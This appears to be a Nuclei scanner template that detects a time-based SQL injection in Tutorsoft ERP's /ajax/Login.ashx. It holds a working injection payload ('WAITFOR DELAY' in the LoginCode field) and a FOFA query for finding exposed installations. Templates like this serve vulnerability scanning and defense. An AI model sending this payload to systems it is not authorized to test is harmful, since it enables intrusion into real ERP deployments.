id: tutorsoft-erp-sqli

info:
  name: Tutorsoft ERP - SQL Injection
  author: qwtd
  severity: high
  reference:
    - https://github.com/wy876/POC/blob/main/%E6%9D%9C%E7%89%B9%E7%BD%91/%E6%9D%9C%E7%89%B9%E7%BD%91%E4%B8%8A%E8%AE%A2%E5%8D%95%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FLogin.ashx%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  metadata:
    fofa: app="TUTORSOFT-ERP"
    verified: true
  tags: TUTORSOFT-ERP

http:
  - raw:
      - |
        POST /ajax/Login.ashx HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close
        Content-Type: application/x-www-form-urlencoded

        LoginCode=1';WAITFOR+DELAY+'0:0:5'--&Password=1&ckRemember=0

    matchers-condition: and
    matchers:
      - type: word
        words:
          - 'Error:账号不存在'
      - type: dsl
        dsl:
          - "duration>=5"
      - type: status
        status:
          - 200
      